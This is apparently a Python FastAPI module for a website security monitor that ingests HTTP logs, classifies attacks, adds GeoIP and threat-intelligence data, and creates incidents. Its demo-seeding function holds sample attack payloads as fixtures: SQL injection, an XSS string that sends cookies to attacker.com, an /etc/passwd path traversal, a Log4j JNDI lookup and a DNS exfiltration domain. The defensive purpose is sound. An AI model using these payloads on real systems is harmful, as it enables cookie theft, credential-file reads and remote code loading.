import random
from typing import List, Optional
from fastapi import APIRouter, Depends, HTTPException
from pydantic import BaseModel
from sqlalchemy.orm import Session
from sqlalchemy import desc

from app.db.database import get_db
from app.db.models import SecurityEvent, Incident
from app.services.log_analyzer import analyze_http_log_entry
from app.services.geoip_service import lookup_ip_geolocation
from app.services.threat_intel import query_virustotal_url_reputation, query_google_safebrowsing

router = APIRouter(prefix="/monitor", tags=["Site Security Monitoring"])

class LogIngestRequest(BaseModel):
    website_domain: str = "authorized-portal.com"
    source_ip: str
    http_method: str = "GET"
    request_path: str
    status_code: int = 200
    user_agent: str = "Mozilla/5.0"
    payload: str = ""

class DomainAuditRequest(BaseModel):
    domain: str

@router.post("/site-audit")
def audit_website_security(req: DomainAuditRequest, db: Session = Depends(get_db)):
    """Perform a full security audit of a website domain: events, VirusTotal, Google Safe Browsing, and IP tracing."""
    domain_clean = req.domain.replace("http://", "").replace("https://", "").split("/")[0].strip()
    if not domain_clean:
        raise HTTPException(status_code=400, detail="Domain cannot be empty")

    # 1. Fetch all logged attacks targeting this domain
    domain_events = db.query(SecurityEvent).filter(
        SecurityEvent.website_domain.ilike(f"%{domain_clean}%")
    ).order_by(desc(SecurityEvent.timestamp)).all()

    # 2. VirusTotal & Google Safe Browsing Check
    target_url = f"https://{domain_clean}"
    vt_data = query_virustotal_url_reputation(target_url)
    gsb_data = query_google_safebrowsing(target_url)

    # 3. Summarize attack types targeting this domain
    attack_summary = {}
    attackers_traced = []
    for evt in domain_events:
        atype = evt.attack_type
        attack_summary[atype] = attack_summary.get(atype, 0) + 1
        if evt.ip_geo_info:
            attackers_traced.append({
                "ip": evt.source_ip,
                "attack": evt.attack_type,
                "severity": evt.severity,
                "country": evt.ip_geo_info.get("country", "Unknown"),
                "city": evt.ip_geo_info.get("city", "Unknown"),
                "asn": evt.ip_geo_info.get("asn", "Unknown"),
                "is_vpn_proxy": evt.ip_geo_info.get("is_vpn_proxy", False)
            })

    return {
        "domain": domain_clean,
        "total_attacks_logged": len(domain_events),
        "attack_breakdown": attack_summary,
        "virustotal": vt_data,
        "google_safebrowsing": gsb_data,
        "traced_attackers": attackers_traced,
        "disclaimer": "IP geolocation and ASN intelligence indicate the apparent network source. Physical attribution requires formal legal authority and ISP cooperation."
    }

@router.post("/ingest")
def ingest_log_event(req: LogIngestRequest, db: Session = Depends(get_db)):
    """Ingest a web server/WAF HTTP log entry, classify cyber attacks, and enrich with GeoIP."""
    
    analysis = analyze_http_log_entry(
        method=req.http_method,
        path=req.request_path,
        status_code=req.status_code,
        user_agent=req.user_agent,
        payload=req.payload
    )

    ip_geo = lookup_ip_geolocation(req.source_ip)

    event = SecurityEvent(
        website_domain=req.website_domain,
        source_ip=req.source_ip,
        http_method=req.http_method.upper(),
        request_path=req.request_path,
        user_agent=req.user_agent,
        status_code=req.status_code,
        attack_type=analysis["attack_type"],
        severity=analysis["severity"],
        confidence=analysis["confidence"],
        evidence_payload=req.payload or req.request_path,
        ip_geo_info=ip_geo
    )

    db.add(event)
    db.commit()
    db.refresh(event)

    # Automatically create Incident if Severity is HIGH or CRITICAL
    created_incident_code = None
    if analysis["is_attack"] and analysis["severity"] in ["HIGH", "CRITICAL"]:
        inc_code = f"INC-2026-{random.randint(1000, 9999)}"
        incident = Incident(
            incident_code=inc_code,
            title=f"Cyber Attack Detected: {analysis['attack_type']} from {req.source_ip}",
            category="Web Cyber Attack",
            severity=analysis["severity"],
            status="NEW",
            source_type="LOG_EVENT",
            source_ref_id=event.id,
            summary=f"Automated detection triggered rule: {analysis['rule_triggered']}. Path: {req.request_path}",
            evidence_hash=event.id
        )
        db.add(incident)
        db.commit()
        created_incident_code = inc_code

    return {
        "status": "ingested",
        "event_id": event.id,
        "is_attack": analysis["is_attack"],
        "attack_type": analysis["attack_type"],
        "severity": analysis["severity"],
        "confidence": analysis["confidence"],
        "ip_geo_info": ip_geo,
        "created_incident_code": created_incident_code
    }

@router.get("/events")
def get_security_events(limit: int = 50, db: Session = Depends(get_db)):
    """Fetch recent web security log events."""
    events = db.query(SecurityEvent).order_by(desc(SecurityEvent.timestamp)).limit(limit).all()
    return events

@router.post("/seed-demo-logs")
def seed_demo_logs(db: Session = Depends(get_db)):
    """Seed prototype demonstration security logs showcasing SQLi, XSS, Brute force, Path traversal."""
    sample_logs = [
        {"ip": "185.220.101.5", "method": "POST", "path": "/login", "status": 401, "payload": "username=admin' OR '1'='1&password=123", "ua": "Mozilla/5.0"},
        {"ip": "45.142.120.10", "method": "GET", "path": "/search?q=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>", "status": 200, "payload": "", "ua": "Mozilla/5.0"},
        {"ip": "185.220.101.5", "method": "GET", "path": "/download?file=../../../../etc/passwd", "status": 403, "payload": "", "ua": "Mozilla/5.0"},
        {"ip": "104.28.19.44", "method": "POST", "path": "/api/v1/user", "status": 500, "payload": "Header: ${jndi:ldap://malicious-log4j-server.com/a}", "ua": "Mozilla/5.0"},
        {"ip": "45.142.120.10", "method": "GET", "path": "/uploads/invoice_update.exe.crypto", "status": 200, "payload": "payload.bin", "ua": "Wget/1.20"},
        {"ip": "185.220.101.5", "method": "GET", "path": "/auth/verify?session_id=PHPSESSID=steal_token_9482", "status": 200, "payload": "", "ua": "Mozilla/5.0"},
        {"ip": "104.28.19.44", "method": "GET", "path": "/dns-query?q=exfil.dnstunnel.com", "status": 200, "payload": "", "ua": "Mozilla/5.0"},
        {"ip": "192.168.1.100", "method": "POST", "path": "/login", "status": 401, "payload": "username=admin&password=badpassword1", "ua": "python-requests/2.28"},
        {"ip": "45.142.120.10", "method": "GET", "path": "/.env", "status": 404, "payload": "", "ua": "sqlmap/1.5.2#stable"}
    ]

    count = 0
    for item in sample_logs:
        req = LogIngestRequest(
            website_domain="client-e-commerce.com",
            source_ip=item["ip"],
            http_method=item["method"],
            request_path=item["path"],
            status_code=item["status"],
            user_agent=item["ua"],
            payload=item["payload"]
        )
        ingest_log_event(req, db)
        count += 1

    return {"status": "seeded", "count": count}
